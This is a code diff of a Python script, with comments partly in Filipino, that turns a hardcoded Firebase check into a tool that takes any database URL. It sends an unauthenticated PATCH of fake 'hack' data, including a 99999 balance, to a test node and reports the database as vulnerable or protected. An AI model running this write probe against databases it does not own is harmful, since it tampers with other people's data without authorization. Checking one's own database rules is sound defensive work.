@@ -25,40 +25,56 @@ def show_banner():
     print("\n")
 
 def test_security():
-    # Ang URL ng Database mo
-    firebase_url = "https://jetmax-fe-default-rtdb.firebaseio.com/users/almaras_test.json"
-    
+    # --- INPUT SECTION ---
+    print(f"{YELLOW}[?] Please paste your Firebase Database URL{RESET}")
+    print(f"{WHITE}(Example: https://your-db-default-rtdb.firebaseio.com/){RESET}")
+    target_url = input(f"{CYAN}URL > {RESET}").strip()
+
+    if not target_url:
+        print(f"{RED}[-] Error: URL cannot be empty!{RESET}")
+        return
+
+    # --- AUTO-FIX URL (Dapat nagtatapos sa .json) ---
+    # Kung ang user ay nag-paste lang ng root URL, idagdag natin ang test node
+    if not target_url.endswith(".json"):
+        if target_url.endswith("/"):
+            target_url += "almaras_test.json"
+        else:
+            target_url += "/almaras_test.json"
+
     # Fake Data for Injection
     data = {
-        "name": "Almaras hacks",
+        "name": "Almaras Guard Hack",
         "balance": 99999.0,
-        "email": "hack@almaras.com",
-        "isVip": True
+        "email": "hacks@almaras.com",
+        "timestamp": int(time.time())
     }
 
-    print(f"{WHITE}[*] Checking Database Security...{RESET}")
-    time.sleep(2) # Pa-epekto na loading
+    print(f"\n{WHITE}[*] Connecting to: {target_url}{RESET}")
+    print(f"{WHITE}[*] Checking Security...{RESET}")
+    time.sleep(2) 
 
     try:
-        response = requests.patch(firebase_url, json=data)
+        # Susubukan nating mag-PATCH (update/inject)
+        response = requests.patch(target_url, json=data)
         
         if response.status_code == 200:
-            print(f"{RED}[!] RESULT: SECURITY VULNERABLE!{RESET}")
-            print(f"{RED}[!] Access Granted: almaras hack Data Injected Successfully.{RESET}")
-            print(f"{YELLOW}[?] Tip: Tighten your Firebase Rules now!{RESET}")
+            print(f"\n{RED}[!] RESULT: SECURITY VULNERABLE!{RESET}")
+            print(f"{RED}[!] Almaras Hacks Data Injected Successfully.{RESET}")
+            print(f"{YELLOW}[?] Tip: Update your Fbdb Rules immediately.{RESET}")
         elif response.status_code == 401 or response.status_code == 403:
-            print(f"{GREEN}[+] RESULT: SECURITY ACTIVE!{RESET}")
-            print(f"{GREEN}[+] Status 403: Permission Denied (Hacker Blocked).{RESET}")
-            print(f"{CYAN}[#] Good job ka streamix! Database is safe.{RESET}")
+            print(f"\n{GREEN}[+] RESULT: SECURITY ACTIVE!{RESET}")
+            print(f"{GREEN}[+] Access Denied (Hacker Blocked by Rules).{RESET}")
+            print(f"{CYAN}[#] Good job streamix! This database is safe.{RESET}")
         else:
-            print(f"{YELLOW}[?] Unknown Status: {response.status_code}{RESET}")
-            print(response.text)
+            print(f"\n{YELLOW}[?] Unknown Status: {response.status_code}{RESET}")
+            print(f"{WHITE}Response: {response.text}{RESET}")
 
     except Exception as e:
-        print(f"{RED}[-] Error connecting to database: {e}{RESET}")
+        print(f"\n{RED}[-] Error: {e}{RESET}")
 
 # --- MAIN RUN ---
 if __name__ == "__main__":
     show_banner()
     test_security()
-    print(f"\n{WHITE}--- Test Finished ---{RESET}")
+    print(f"\n{WHITE}--- Security Test Finished ---{RESET}")
